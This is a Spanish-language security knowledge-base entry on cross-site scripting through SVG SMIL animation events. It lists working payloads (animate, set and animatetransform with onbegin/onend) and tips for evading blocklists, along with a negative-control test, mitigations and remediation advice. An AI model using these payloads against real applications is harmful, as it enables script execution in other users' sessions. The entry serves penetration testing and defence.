---
clase: xss
tech: svg-smil
cwe: CWE-79
cvss: 6.1 # [derivado] reflejado en contexto HTML
payload: |
  # onbegin - dispara al comenzar la animacion SMIL. Chrome/Firefox/Safari: SI.
  <svg><animate onbegin=alert(1) attributeName=x dur=1s>

  # onend - dispara al terminar. Chrome/Firefox/Safari: SI.
  <svg><animate onend=alert(1) attributeName=x dur=1s>

  # La pagina fuente lista estas etiquetas como portadoras de onbegin/onend:
  #   animate   animatemotion   animatetransform   set
  # Ejemplos equivalentes con las otras etiquetas SMIL:
  <svg><set onbegin=alert(1) attributeName=x dur=1s>
  <svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
precondicion: "El sink permite inyectar SVG. Observese que ninguna de las dos etiquetas se cierra en el vector: el parser HTML las autocierra, asi que el payload funciona truncado. 'attributeName=x' y 'dur=1s' son necesarios para que la animacion SMIL sea valida y arranque; sin ellos el evento no se dispara."
como_se_descubre: |
  Señal en recon: la aplicacion acepta SVG (subida de avatares, previsualizacion de
  iconos, campos que renderizan SVG inline) o un sanitizador cuya allowlist incluye
  `<svg>` por considerarlo "solo grafico". Prueba barata:
  `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`. Si el filtro bloquea
  `animate`, probar `set`, `animatetransform` y `animatemotion`: son cuatro nombres
  distintos para el mismo evento y las listas negras suelen cubrir solo el primero.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: <svg><animate onbegin=alert(1) attributeName=x dur=1s>  -> ejecuta
  # B: <svg><animate onbegin=alert(1)>   (sin attributeName ni dur)
  #    -> NO ejecuta: la animacion SMIL es invalida y nunca comienza
  # El par aisla que la ejecucion depende de una animacion VALIDA, no del handler.
mata: |
  - El sink codifica `<` y `>` -> muere.
  - Sanitizador SVG que aplique allowlist de elementos SMIL (elimina animate/set/
    animatetransform/animatemotion) -> muere.
  - CSP sin 'unsafe-inline'.
  - El SVG se sirve con Content-Type que no se renderiza como documento activo
    (p.ej. image/svg+xml descargado en vez de inline) y el origen esta aislado.
fuente: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (PortSwigger XSS cheat sheet; pagina actualizada 2026-10-21). Bajo 'Event handlers that do not require user interaction'. La pagina lista para onbegin/onend las etiquetas: 'animate animatemotion animatetransform set'."
confianza: alta
fecha: 2026-11-02
---
# [XSS] Animación SMIL en SVG (`<animate onbegin>`) — cuatro nombres de etiqueta para el mismo sink

## Principio
SVG trae su propio motor de animación, SMIL, con eventos propios y handlers inline.
Un sanitizador que trate SVG como "contenido gráfico inofensivo" y lo deje pasar en
bloque está permitiendo un motor de ejecución. Y el mismo evento vive en **cuatro**
etiquetas distintas, así que una lista negra incompleta deja tres puertas abiertas.

## Payload
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

Dos detalles importan. Ninguna etiqueta se cierra: el parser HTML las autocierra, así
que el vector sobrevive truncado por longitud de campo. Y `attributeName=x` con
`dur=1s` no son relleno: sin una animación SMIL válida el evento `begin` nunca se
emite (ver control negativo).

La variante por fin de animación:

```html
<svg><animate onend=alert(1) attributeName=x dur=1s>
```

Y los tres alias de etiqueta, que la fuente lista explícitamente como portadores del
mismo evento:

```html
<svg><set onbegin=alert(1) attributeName=x dur=1s>
```

```html
<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
```

## Impacto
Ejecución en el origen sin interacción, en los tres motores principales. El escenario
de mayor valor es la subida de SVG: si la aplicación acepta SVG como avatar o icono y
lo sirve inline desde el mismo origen, el vector pasa de reflejado a **almacenado**, y
ejecuta para cada usuario que vea el perfil o el listado.

## Remediación
Si se acepta SVG del usuario, sanitizarlo con una librería que aplique allowlist de
elementos y atributos SVG, no con un filtro de HTML genérico. `# [derivado]`: servir
los SVG subidos desde un origen aislado (dominio sandbox) y con
`Content-Disposition: attachment` donde sea posible, de modo que un SVG malicioso no
ejecute en el origen de la aplicación. Eliminar `animate`, `animatemotion`,
`animatetransform` y `set` como conjunto, nunca de uno en uno.
